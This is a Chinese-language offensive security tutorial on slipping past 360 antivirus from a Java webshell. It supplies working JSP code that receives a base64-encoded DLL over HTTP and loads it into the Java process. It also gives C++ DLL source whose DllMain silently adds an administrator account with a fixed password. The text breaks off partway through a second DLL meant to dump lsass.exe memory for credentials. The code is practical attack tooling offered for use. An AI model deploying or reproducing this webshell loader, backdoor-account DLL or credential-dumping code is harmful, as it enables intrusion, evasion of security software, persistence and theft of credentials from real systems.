**作者：倾旋  
原文链接：**
通常情况下获得Java
Webshell碰到数字杀毒的场景居多，在这个环境中经常会遇到无法执行命令或命令被拦截的情况，很多小伙伴遇到这个问题就劝退了，我猜测是有一套进程链的检测方式导致了命令无法执行，于是去查看Java的文档，查阅到Java能够加载动态链接库且能够执行动态链接库中的代码，本文演示如何利用Java加载动态链接库的方式实现绕过了数字杀毒的拦截.....
## 0x00 前言
通常情况下获得Java
Webshell碰到数字杀毒的场景居多，在这个环境中经常会遇到无法执行命令或命令被拦截的情况，很多小伙伴遇到这个问题就劝退了，我猜测是有一套进程链的检测方式导致了命令无法执行，于是去查看Java的文档，查阅到Java能够加载动态链接库且能够执行动态链接库中的代码，本文演示如何利用Java加载动态链接库的方式实现绕过了数字杀毒的拦截，但在演示之前，需要铺垫一些基础知识，如：猜想的进程链、Windows错误代码、Java加载动态链接库常见的三种办法、Windows动态链接库、土豆提权原理、命名管道技术等。
## 0x01 猜想的进程链
在获取Webshell以后，一般执行命令都会调用 `Runtime.exec` ，当然也有其他的命令执行方式，这里不再讨论，执行的命令一般分为两种：
  * 系统自带的PE文件，后面跟上参数
  * CMD或Powershell中内置的命令
例如：`dir` 命令与`forfiles`命令，这两个命令都可以列出文件夹内的文件，但要执行 `dir` 需要启动 `cmd.exe` 或者
`powershell.exe` ，执行的过程中进程链就像这样：
在这个过程里，进程的链是`java.exe`创建了`cmd.exe` ，那么很容易就能发现问题，每执行一条命了都会创建一个`cmd.exe`
的进程。从`Runtime.exec` 执行命令到Windows API CreateProcess
创建`cmd.exe`这个进程是通过JVM翻译过来的，数字杀毒会Hook CreateProcess API达到监控拦截的目的。
而forfiles是一个PE文件，不是CMD内置的命令，所以不需要创建`cmd.exe`也可以执行，它的进程链会是这样：
达到了同样的目的，但是没有创建`cmd.exe`
，为了体验上的考量现在的大部分Webshell管理工具执行命令都是要创建cmd.exe的，那么如何让我们的操作都不创建`cmd.exe`呢？
其实只需要改一下原来的小马即可：
    public static void main(String[] args) {
        try {
                    // String cmdStr = "cmd.exe /c forfiles.exe /p C:\\" ;
            String cmdStr = "forfiles.exe /p C:\\" ;
            Runtime.getRuntime().exec(cmdStr);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
这样虽然不会创建进程，但大部分命令还是会拦截，例如：net.exe net1.exe
## 0x02 Windows错误代码
经常会遇到一些Windows下的工具刨出Error Code 5，到底代表什么意思？
这个Error Code 5其实是Windows的错误代码，每一个代码都代表了不同的含义。
查询错误代码的含义可以通过 `net helpmsg` 命令：
Visual Studio 有一个工具可以查询错误代码，名为errlookup：
有的时候Webshell管理工具并没有直接给出错误代码的含义，而是直接抛出错误代码，这种情况就能使用命令或者工具去查询，了解错误的发生到底是因为什么问题。
## 0x03 Java加载动态链接库常见的三种办法
Java加载动态链接库常见的有三种办法：
  * System.load / System.loadLibrary
  * Runtime.getRuntime().load
  * com.sun.glass.utils.NativeLibLoader.loadLibrary
    private void RuntimeLoad(String path){
        Runtime.getRuntime().load(path);
    }
    private void SystemLoad(String path){
        System.load(path);
    }
    // 有些JDK版本没有这个对象，因此采用反射加载进行运行
    private void NativeLoad(String path) throws Exception{
        Class Native = Class.forName("com.sun.glass.utils.NativeLibLoader");
        if(Native != null){
            java.lang.reflect.Method Load = Native.getDeclaredMethod("loadLibrary",String.class);
            Load.invoke(path);
        }
    }
第三种有些JDK版本没有这个对象，因此采用反射加载进行运行。
大致流程如下：
    System.load` → `Runtime.getRuntime**()**.load0**()**` → `ClassLoader.loadLibrary` → `NativeLibrary.load` → `native void load*(*String name, boolean isBuiltin*)*
我实现了一个简单版本的DLL加载JSP代码，确保每一个请求都可以加载一个DLL模块到Java进程中：
    // 获取随机的动态链接库文件名称
    private String getFileName(){
        String fileName = "";
        java.util.Random random = new java.util.Random(System.currentTimeMillis());
        String os = System.getProperty("os.name").toLowerCase();
        if (os.contains("windows")){
            fileName = "C:\\Windows\\Temp\\" + random.nextInt(10000000) + ".dll";
        }else {
            fileName = "/tmp/"+ random.nextInt(10000000) + ".so";
        }
        return fileName;
    }
    // JSP 声明函数中无法获取全局默认的ServletRequest对象，但ServletRequest继承java.io.InputStream，可以替代
    public String UploadBase64DLL(java.io.InputStream stream) throws Exception {
        sun.misc.BASE64Decoder b = new sun.misc.BASE64Decoder();
        java.io.File file = new java.io.File(getFileName());
        java.io.FileOutputStream fos = new java.io.FileOutputStream(file);
        fos.write(b.decodeBuffer(stream));
        fos.close();
        return file.getAbsolutePath();
    }
    private void RuntimeLoad(String path){
        Runtime.getRuntime().load(path);
    }
    private void SystemLoad(String path){
        System.load(path);
    }
    // 有些JDK版本没有这个对象，因此采用反射加载进行运行
    private void NativeLoad(String path) throws Exception{
        Class Native = Class.forName("com.sun.glass.utils.NativeLibLoader");
        if(Native != null){
            java.lang.reflect.Method Load = Native.getDeclaredMethod("loadLibrary",String.class);
            Load.invoke(path);
        }
    }
        // 加载方式
        String method = request.getHeader("WWW-Authenticate");
        try{
            ServletInputStream stream = request.getInputStream();
          if (stream.available() == 0){
              out.println(System.getProperty("os.arch"));
              return;
          }
          String file =  UploadBase64DLL(stream);
          // 按照Header头选择加载方式
          switch (method){
              case "1":
                  RuntimeLoad(file);
                  break;
              case "2":
                  SystemLoad(file);
                  break;
              case "3":
                  NativeLoad(file);
                  break;
              default:
                  RuntimeLoad(file);
                  break;
          }
        }catch (Exception e){
            System.out.println(e.toString());
        }
## 0x04 Windows 动态链接库
DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。
在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。在Windows平台下，我们使用的应用程序中的功能其实大多都很相似，窗口调用窗口的模块，分配内存调用内存管理的模块，文件操作调用IO模块，这些模块在Windows里的具体表现就是DLL文件。
在之前的文章中有简单总结过Dll的一些知识，这里就不做详细介绍了：
  * [DllMain与rundll32详解](https://payloads.online/archivers/2019-10-02/1/)
  * [DLL Hijacking & COM Hijacking ByPass UAC - 议题解读](https://payloads.online/archivers/2018-12-22/1/#0x02-dll是什么)
在Windows操作系统中，每一个进程加载一个DLL都会默认执行DLLMain函数，利用这个加载的特性我们可以在Java.exe进程中做一些敏感操作，并且这个进程是白名单、签名的。
## 0x05 实战绕过数字杀毒添加用户
前提条件：
  * 有一个管理员权限的Webshell
  * 编写一个添加用户的DLL
首先上传之前写好的专门用于加载DLL的JSP文件，然后编写一个添加用户的DLL文件：
    // dllmain.cpp : 定义 DLL 应用程序的入口点。
    #include "pch.h"
    #include 
    #include 
    #include 
    #include 
    #include 
    #pragma comment(lib,"netapi32.lib")
    DWORD CreateAdminUserInternal(void)
    {
        NET_API_STATUS rc;
        BOOL b;
        DWORD dw;
        USER_INFO_1 ud;
        LOCALGROUP_MEMBERS_INFO_0 gd;
        SID_NAME_USE snu;
        DWORD cbSid = 256;  // 256 bytes should be enough for everybody :)
        BYTE Sid[256];
        DWORD cbDomain = 256 / sizeof(TCHAR);
        TCHAR Domain[256];
        //
        // Create user
        // http://msdn.microsoft.com/en-us/library/aa370649%28v=VS.85%29.aspx
        //
        memset(&ud, 0, sizeof(ud));
        ud.usri1_name = (LPWSTR)TEXT("audit");                      // username
        ud.usri1_password = (LPWSTR)TEXT("Test123456789!");             // password
        ud.usri1_priv = USER_PRIV_USER;                 // cannot set USER_PRIV_ADMIN on creation
        ud.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT; // must be set
        ud.usri1_script_path = NULL;
        rc = NetUserAdd(
            NULL,           // local server
            1,              // information level
            (LPBYTE)&ud,
            NULL            // error value
        );
        if (rc != NERR_Success) {
            _tprintf(_T("NetUserAdd FAIL %d 0x%08x\r\n"), rc, rc);
            return rc;
        }
        //
        // Get user SID
        // http://msdn.microsoft.com/en-us/library/aa379159(v=vs.85).aspx
        //
        b = LookupAccountName(
            NULL,           // local server
            _T("audit"),    // account name
            Sid,            // SID
            &cbSid,         // SID size
            Domain,         // Domain
            &cbDomain,      // Domain size
            &snu            // SID_NAME_USE (enum)
        );
        if (!b) {
            dw = GetLastError();
            _tprintf(_T("LookupAccountName FAIL %d 0x%08x\r\n"), dw, dw);
            return dw;
        }
        //
        // Add user to "Administrators" local group
        // http://msdn.microsoft.com/en-us/library/aa370436%28v=VS.85%29.aspx
        //
        memset(&gd, 0, sizeof(gd));
        gd.lgrmi0_sid = (PSID)Sid;
        rc = NetLocalGroupAddMembers(
            NULL,                   // local server
            _T("Administrators"),
            0,                      // information level
            (LPBYTE)&gd,
            1                       // only one entry
        );
        if (rc != NERR_Success) {
            _tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\r\n"), rc, rc);
            return rc;
        }
        return 0;
    }
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            CreateAdminUserInternal();
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
在DllMain函数中调用CreateAdminUserInternal实现添加管理员用户audit。将dll文件进行base64编码，发送到加载动态链接库的jsp页面，就可以绕过数字杀毒添加用户了：
发送之前：
发送之后：
至此管理员用户添加成功。
当DLL的编译架构与Java进程的位数不同，加载会失败，抛出：`Can't load AMD 64-bit .dll on a IA 32-bit
platform。`
这个问题只需要调整DLL的编译架构就行：
同样的我们还可以调用comsvcs.dll导出的MiniDumpW转储lsass.exe进程的内存。
    // dllmain.cpp : 定义 DLL 应用程序的入口点。
    #include "pch.h"
    #include 
    #include 
    #include 
    #include 
    #pragma comment( lib, "Dbghelp.lib" )
    typedef HRESULT(WINAPI* _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);
    bool EnableDebugPrivilege()
    {
        HANDLE hThis = GetCurrentProcess();
        HANDLE hToken;
        OpenProcessToken(hThis, TOKEN_ADJUST_PRIVILEGES, &hToken);
        LUID luid;
        LookupPrivilegeValue(0, TEXT("seDebugPrivilege"), &luid);
        TOKEN_PRIVILEGES priv;
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Luid = luid;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;